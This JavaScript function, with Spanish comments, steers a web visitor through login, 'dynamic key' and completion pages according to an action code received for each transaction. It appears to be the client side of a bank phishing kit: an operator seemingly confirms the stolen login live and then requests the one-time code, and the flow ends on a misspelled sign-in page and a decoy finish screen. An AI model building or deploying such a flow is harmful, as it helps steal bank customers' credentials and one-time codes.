async function handleAction(action, transactionId) {
  const loadingSpinner = document.querySelector(".loadingContainer");
  const errorLogin = document.getElementById("error-login");
  
  // Extraer el tipo de acción (antes de los dos puntos)
  const actionType = action.split(':')[0];
  
  switch (actionType) {
    case 'correcto':
      // Datos correctos, continuar al simulador de préstamos
      window.location.href = "loan-simulator.html";
      break;
      
    case 'incorrecto':
    case 'error_login':
      // Datos incorrectos, volver al login con error
      window.location.href = "accces-sign-in.html?error=1";
      break;
      
    case 'pedir_dinamica':
      // Solicitar clave dinámica
      window.location.href = "auth-dinamica.html";
      break;
      
    case 'error_dinamica':
      // Error en la dinámica
      if (loadingSpinner) loadingSpinner.style.display = "none";
      const errorMessage = document.querySelector(".errorMessage");
      if (errorMessage) {
        errorMessage.style.display = "block";
        errorMessage.style.opacity = "1";
        errorMessage.style.transform = "translateY(0)";
        setTimeout(() => {
          errorMessage.style.opacity = "0";
          errorMessage.style.transform = "translateY(20px)";
        }, 5000);
      }
      // Volver a pedir la dinámica después de 5 segundos
      setTimeout(() => {
        window.location.href = "auth-dinamica.html";
      }, 5000);
      break;
      
    case 'finish':
      // Finalizar proceso
      if (loadingSpinner) loadingSpinner.style.display = "none";
      const finishContainer = document.querySelector(".finishContainer");
      const sectionTeclado = document.querySelector("#keyboard");
      if (finishContainer) finishContainer.style.display = "block";
      if (sectionTeclado) sectionTeclado.style.display = "none";
      // Opcional: redirigir a página de éxito
      setTimeout(() => {
        window.location.href = "../index.html";
      }, 3000);
      break;
      
    default:
      console.error("Acción desconocida:", action);
      if (loadingSpinner) loadingSpinner.style.display = "none";
      alert("Error en la validación. Por favor intenta nuevamente.");
      window.location.href = "accces-sign-in.html";
  }
}
